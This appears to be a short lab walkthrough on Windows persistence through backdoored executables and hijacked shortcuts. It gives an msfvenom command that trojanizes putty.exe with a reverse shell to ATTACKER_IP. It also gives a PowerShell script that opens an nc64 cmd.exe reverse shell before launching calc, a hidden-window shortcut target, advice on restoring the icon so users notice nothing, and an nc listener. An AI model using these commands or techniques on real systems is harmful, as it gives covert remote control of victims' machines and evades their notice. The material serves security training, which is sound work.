# Backdoor Executable

### Executable Files

* If you find any executable laying around the desktop, the chances are high that the user might use it frequently.
* Suppose we find a shortcut to `PuTTY` lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![im](https://user-images.githubusercontent.com/75596877/181036507-79d32d8d-2337-481f-b4c4-6766d6606f21.png)

* Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

* Finally, we'll change the shortcut to point to our script.
* Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user.
* We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![](https://user-images.githubusercontent.com/75596877/181037158-baa12732-f2d9-412f-aaa9-8ca74d3123b2.png)

* Let's start an nc listener to receive our reverse shell on our attacker's machine:

```
nc -lvp 4445
```

* If you double-click the shortcut, you should get a connection back to your attacker's machine.
* Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen.
